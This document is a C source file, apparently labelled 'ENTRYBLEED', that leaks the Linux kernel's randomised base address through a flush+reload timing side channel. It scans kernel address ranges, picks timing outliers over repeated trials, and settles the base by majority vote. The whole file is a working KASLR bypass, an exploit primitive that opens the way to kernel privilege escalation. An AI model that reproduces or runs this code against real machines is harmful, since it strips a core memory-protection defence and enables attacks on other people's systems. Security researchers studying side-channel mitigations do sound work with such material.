#define _GNU_SOURCE
#include <sched.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libs/util.h"

#define ARRAY_LEN(x) (sizeof(x) / sizeof((x)[0]))

// #define MIN
#define MAX

#define START 0xffffffff81000000ull
#define END 0xffffffffc0000000ull
#define STEP 0x0000000000200000ull
#define OFFSET -0x200000
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext (check debug)
#define WINDOW_SIZE 3

#ifdef MAX
#define OUTLIER_CMP >
#else
#define OUTLIER_CMP <
#endif

/*******************************
 * ENTRYBLEED                  *
 *******************************/

size_t bypass_kaslr();
int main(int argc, char **argv) {
  pin_cpu(0, 0);
  size_t base = bypass_kaslr();
  lhex(base);
}

size_t bypass_kaslr() {
  size_t base;

  while (1) {
    u64 bases[NUM_TRIALS] = {0};

    for (int vote = 0; vote < ARRAY_LEN(bases); vote++) {
      size_t times[(END - START) / STEP] = {};
      u64 addrs[(END - START) / STEP];

      for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
        times[ti] = ~0;
        addrs[ti] = START + STEP * (u64)ti;
      }

      for (int i = 0; i < 16; i++) {
        for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
          u64 addr = addrs[ti];
          size_t t = flushandreload((void *)addr);
          if (t < times[ti] && t != 0) {
            times[ti] = t;
          }
        }
      }

#ifdef DEBUG
      size_t start = 0;
      for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
        if (times[ti] != times[start] || ti == ARRAY_LEN(times) - 1) {
          ldebug("addr %llx[%04lx] time %zu", addrs[start],
                 (addrs[ti - 1] - addrs[start]) / STEP, times[start]);
          start = ti;
        }
      }
#endif

      u64 outlier = 0 OUTLIER_CMP 1 ? ~0 : 0;
      int outlier_i = 0;
      for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
        u64 sum = 0;

        for (int i = 0; i < WINDOW_SIZE; i++)
          sum += times[ti + i];

        if (sum OUTLIER_CMP outlier) {
          outlier = sum;
          outlier_i = ti;
        }
      }

      bases[vote] = addrs[outlier_i];
      ldebug("vote %d: base = %llx (sum=%lld)", vote, bases[vote], outlier);
    }

    int c = 0;
    for (int i = 0; i < ARRAY_LEN(bases); i++) {
      if (c == 0) {
        base = bases[i];
      } else if (base == bases[i]) {
        c++;
      } else {
        c--;
      }
    }

    c = 0;
    for (int i = 0; i < ARRAY_LEN(bases); i++)
      if (base == bases[i])
        c++;

    if (c > ARRAY_LEN(bases) / 2)
      break;

    ldebug("majority vote failed:");
    ldebug("base = %llx with %ld votes", base, c);
  }

  base += OFFSET;
  return base;
}
